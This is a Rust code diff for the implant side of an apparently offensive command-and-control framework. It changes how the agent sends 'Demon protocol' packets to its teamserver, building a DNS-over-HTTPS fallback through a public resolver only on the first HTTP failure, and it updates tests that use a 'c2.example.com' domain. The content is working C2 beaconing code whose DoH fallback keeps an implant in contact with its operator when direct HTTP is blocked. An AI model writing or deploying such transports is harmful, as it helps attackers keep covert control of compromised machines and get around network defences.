@@ -7,10 +7,14 @@
 //! [`FallbackTransport`] tries the HTTP transport first and automatically
 //! retries via DoH when HTTP fails and a `doh_domain` is configured.
 
+use std::sync::{Arc, Mutex};
+
 use tracing::{debug, warn};
 
+use red_cell_common::crypto::ecdh::AgentTransport;
+
 use crate::config::SpecterConfig;
-use crate::doh_transport::DohTransport;
+use crate::doh_transport::{DohProvider, DohTransport};
 use crate::error::SpecterError;
 
 /// HTTP transport for sending Demon protocol packets to the teamserver.
@@ -67,33 +71,34 @@ impl HttpTransport {
 
 /// Transport that tries HTTP first and falls back to DoH on failure.
 ///
-/// When `doh` is `None` (i.e. `doh_domain` was not configured), the behaviour
-/// is identical to calling `HttpTransport::send` directly — no retry overhead.
+/// When no `doh_domain` is configured, behaviour matches
+/// [`HttpTransport::send`] (no DoH retry).
+///
+/// The DoH client (HTTPS to a public resolver) is built **lazily** on the first
+/// HTTP failure so startup stays aligned with non-DoH agents until fallback
+/// is needed.
 #[derive(Debug)]
 pub struct FallbackTransport {
     http: HttpTransport,
-    doh: Option<DohTransport>,
+    doh_domain: Option<String>,
+    doh_provider: DohProvider,
+    /// Filled on first HTTP failure when [`Self::doh_domain`] is set.
+    doh: Mutex<Option<Arc<DohTransport>>>,
 }
 
 impl FallbackTransport {
     /// Build a `FallbackTransport` from agent configuration.
     ///
-    /// If `config.doh_domain` is set, a `DohTransport` is created and will be
-    /// used automatically whenever the HTTP send fails.
+    /// If `config.doh_domain` is set, a `DohTransport` is built on demand when
+    /// the primary HTTP send fails.
     pub fn new(config: &SpecterConfig) -> Result<Self, SpecterError> {
         let http = HttpTransport::new(config)?;
-        let doh = match &config.doh_domain {
-            Some(domain) => Some(DohTransport::new(domain.clone(), config.doh_provider)?),
-            None => None,
-        };
-        Ok(Self { http, doh })
-    }
-
-    /// Return a reference to the primary HTTP transport.
-    ///
-    /// Used by the ECDH handshake which requires a typed `&HttpTransport`.
-    pub fn primary(&self) -> &HttpTransport {
-        &self.http
+        Ok(Self {
+            http,
+            doh_domain: config.doh_domain.clone(),
+            doh_provider: config.doh_provider,
+            doh: Mutex::new(None),
+        })
     }
 
     /// Send `packet` to the teamserver.
@@ -103,17 +108,41 @@ impl FallbackTransport {
     pub async fn send(&self, packet: &[u8]) -> Result<Vec<u8>, SpecterError> {
         match self.http.send(packet).await {
             Ok(resp) => Ok(resp),
-            Err(http_err) => match &self.doh {
-                Some(doh) => {
-                    warn!(
-                        http_error = %http_err,
-                        "HTTP transport failed — retrying via DNS-over-HTTPS fallback"
-                    );
-                    doh.send(packet).await
-                }
-                None => Err(http_err),
-            },
+            Err(http_err) => {
+                let Some(domain) = self.doh_domain.as_ref() else {
+                    return Err(http_err);
+                };
+                let doh = {
+                    let mut slot = self.doh.lock().map_err(|_| {
+                        SpecterError::Transport(
+                            "DoH client initialization mutex poisoned".to_owned(),
+                        )
+                    })?;
+                    if slot.is_none() {
+                        *slot =
+                            Some(Arc::new(DohTransport::new(domain.clone(), self.doh_provider)?));
+                    }
+                    slot.as_ref()
+                        .ok_or_else(|| {
+                            SpecterError::Transport(
+                                "DoH transport missing after initialization".to_owned(),
+                            )
+                        })?
+                        .clone()
+                };
+                warn!(
+                    http_error = %http_err,
+                    "HTTP transport failed — retrying via DNS-over-HTTPS fallback"
+                );
+                doh.send(packet).await
+            }
         }
+    }
+}
+
+impl AgentTransport for FallbackTransport {
+    async fn send(&self, packet: &[u8]) -> Result<Vec<u8>, String> {
+        Self::send(self, packet).await.map_err(|e| e.to_string())
     }
 }
 
@@ -292,13 +321,17 @@ mod tests {
         let config =
             SpecterConfig { doh_domain: Some("c2.example.com".to_string()), ..Default::default() };
         let t = FallbackTransport::new(&config).expect("FallbackTransport creation");
-        assert!(t.doh.is_some(), "DoH transport should be Some when doh_domain is set");
+        assert!(
+            t.doh.lock().expect("lock").is_none(),
+            "DoH client is lazy — not built until first HTTP failure"
+        );
     }
 
     #[test]
     fn fallback_transport_without_doh_domain_has_no_doh() {
         let config = SpecterConfig { doh_domain: None, ..Default::default() };
         let t = FallbackTransport::new(&config).expect("FallbackTransport creation");
-        assert!(t.doh.is_none(), "DoH transport should be None when doh_domain is absent");
+        assert!(t.doh_domain.is_none());
+        assert!(t.doh.lock().expect("lock").is_none());
     }
 }
